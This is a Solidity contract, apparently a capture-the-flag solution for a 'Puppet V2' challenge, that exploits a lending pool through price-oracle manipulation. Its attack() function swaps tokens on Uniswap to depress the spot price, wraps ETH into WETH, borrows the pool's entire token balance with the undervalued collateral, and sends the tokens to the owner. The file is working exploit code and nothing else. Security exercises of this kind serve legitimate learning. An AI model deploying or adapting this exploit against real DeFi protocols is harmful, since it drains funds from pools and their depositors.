//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH{
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IUniswapV2Router02{

    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPool{
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external returns (uint256);
}

contract AttackerPuppetV2{

    address immutable owner;
    IUniswapV2Router02 private _uniswapRouter;
    IPool private _pool;
    IERC20 private _token;
    IERC20 private _weth;

   constructor(
    address wethAddress,
    address tokenAddress,
    address uniswapRouterAddress,
    address pool){
        owner = msg.sender;
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapRouter = IUniswapV2Router02(uniswapRouterAddress);
        _pool = IPool(pool);
    }

    function attack() external payable{
        // exchanged with uniswap
        uint256 amountToken = _token.balanceOf(address(this));
        _token.approve(address(_uniswapRouter), amountToken);
        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForTokens(amountToken, 9, path, address(this),block.timestamp);

        // converted in weth
        uint256 amountEth = address(this).balance;
        IWETH(address(_weth)).deposit{ value: amountEth}();

        // calculate the required weth and aproving the pool
        uint256 requireAmount = _weth.balanceOf(address(this));
        _weth.approve(address(_pool), requireAmount);

        // borowing the token
        uint256 tokenAmount = _token.balanceOf(address(_pool));
        _pool.borrow(tokenAmount);
        _token.transfer(owner, _token.balanceOf(address(this)));

    }
    receive() external payable{}
}